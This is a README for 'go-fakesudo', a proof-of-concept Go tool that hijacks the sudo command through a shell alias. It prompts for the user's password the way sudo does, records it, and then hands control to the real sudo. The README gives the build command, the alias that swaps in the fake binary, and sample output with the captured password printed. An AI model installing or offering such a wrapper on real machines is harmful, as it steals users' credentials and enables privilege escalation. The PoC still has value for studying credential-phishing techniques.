# go-fakesudo
Proof of concept Go code for recording a password by hijacking sudo.

> Get someone's password by asking for it on the right moment.

## Concept 

The idea of this code is to wrap the 'sudo' command, to ask for the password in the same way sudo does, before handing over control to the real sudo command.

Note that in current form, it prints the password in the console, instead of sending it to somewhere:

```
rvben@pc:~/go-fakesudo$ ./fakesudo ls -al
[sudo] password for rvben: 
Sorry, try again.

Password typed: mypassword
[sudo] password for rvben: 
Makefile  README.md  fakesudo  fakesudo.go
```

## Getting started
1. Build fakesudo
```bash
go build fakesudo.go
```

2. Set alias
```bash
alias sudo='`pwd`/fakesudo'
```

3. Use sudo
```bash
$ sudo vim /etc/hosts
[sudo] password for rvben:
```